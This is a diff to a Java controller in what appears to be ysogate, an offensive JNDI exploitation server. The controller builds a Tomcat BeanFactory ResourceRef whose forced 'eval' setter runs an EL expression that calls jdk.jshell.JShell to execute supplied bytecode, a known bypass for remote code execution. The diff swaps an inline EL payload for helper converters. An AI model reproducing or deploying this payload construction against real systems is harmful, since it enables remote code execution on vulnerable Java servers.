@@ -5,8 +5,12 @@ import com.h2tg.ysogate.annotation.JNDIMapping;
 import com.h2tg.ysogate.controller.BasicController;
 import org.apache.naming.ResourceRef;
 import javax.naming.StringRefAddr;
-import static com.h2tg.ysogate.controller.bypass.converter.EvalConverter.LoadByJshell;
 
+import java.util.Base64;
+import static com.h2tg.ysogate.bullet.defineClass.ElConverter.el2jshell;
+import static com.h2tg.ysogate.bullet.defineClass.JShellConverter.jshell2defineClass;
+
+@Deprecated
 @JNDIController
 @JNDIMapping("/EL2JShell")
 public class EL2JShellController extends BasicController {
@@ -14,12 +18,10 @@ public class EL2JShellController extends BasicController {
     public Object process(Object obj) {
         byte[] byteCode = (byte[]) obj;
         System.out.println("[Reference] Factory: BeanFactory + ELProcessor");
-
-        String code = LoadByJshell(byteCode);
-
+        String code = jshell2defineClass(Base64.getEncoder().encodeToString(byteCode));
         ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=eval"));
-        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"eval\",\"\".getClass()).invoke(\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null),\""+code+"\")"));
+        ref.add(new StringRefAddr("x", el2jshell(code)));
         return ref;
     }
 }
